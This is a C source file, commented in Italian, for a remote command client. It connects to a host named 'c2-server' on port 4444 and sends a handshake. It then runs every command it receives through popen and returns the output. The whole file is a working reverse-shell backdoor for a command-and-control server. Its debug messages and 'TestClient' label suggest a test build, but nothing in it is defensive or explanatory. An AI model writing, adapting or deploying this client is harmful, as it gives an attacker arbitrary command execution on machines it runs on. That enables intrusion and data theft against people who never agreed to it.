#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#define SERVER_IP "c2-server"
#define SERVER_PORT 4444

int main() {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[1024];
    
    printf("[DEBUG] Client starting\n");
    
    // Risoluzione DNS
    printf("[DEBUG] Resolving %s...\n", SERVER_IP);
    struct hostent *server = gethostbyname(SERVER_IP);
    if (!server) {
        printf("[ERROR] Cannot resolve %s\n", SERVER_IP);
        return 1;
    }
    printf("[DEBUG] Resolved to %s\n", inet_ntoa(*(struct in_addr*)server->h_addr));
    
    // Creazione socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("[ERROR] socket");
        return 1;
    }
    printf("[DEBUG] Socket created\n");
    
    // Configura indirizzo
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    memcpy(&server_addr.sin_addr, server->h_addr, server->h_length);
    
    // Connessione
    printf("[DEBUG] Connecting to %s:%d...\n", SERVER_IP, SERVER_PORT);
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("[ERROR] connect");
        close(sock);
        return 1;
    }
    printf("[DEBUG] Connected successfully!\n");
    
    // Invia handshake
    char handshake[] = "HELLO|TestClient|Debug";
    printf("[DEBUG] Sending handshake: %s\n", handshake);
    send(sock, handshake, strlen(handshake), 0);
    
    // Ricevi READY
    printf("[DEBUG] Waiting for READY...\n");
    int bytes = recv(sock, buffer, sizeof(buffer)-1, 0);
    if (bytes <= 0) {
        perror("[ERROR] recv READY");
        close(sock);
        return 1;
    }
    buffer[bytes] = '\0';
    printf("[DEBUG] Received: %s\n", buffer);
    
    // Loop comandi
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        bytes = recv(sock, buffer, sizeof(buffer)-1, 0);
        
        if (bytes <= 0) {
            printf("[DEBUG] Connection closed\n");
            break;
        }
        
        buffer[bytes] = '\0';
        printf("[DEBUG] Command received: %s\n", buffer);
        
        // Esegui comando
        FILE *fp = popen(buffer, "r");
        if (fp) {
            char output[1024] = {0};
            while (fgets(output + strlen(output), sizeof(output) - strlen(output), fp));
            pclose(fp);
            
            printf("[DEBUG] Sending output: %s\n", output);
            send(sock, output, strlen(output), 0);
        }
    }
    
    close(sock);
    return 0;
}
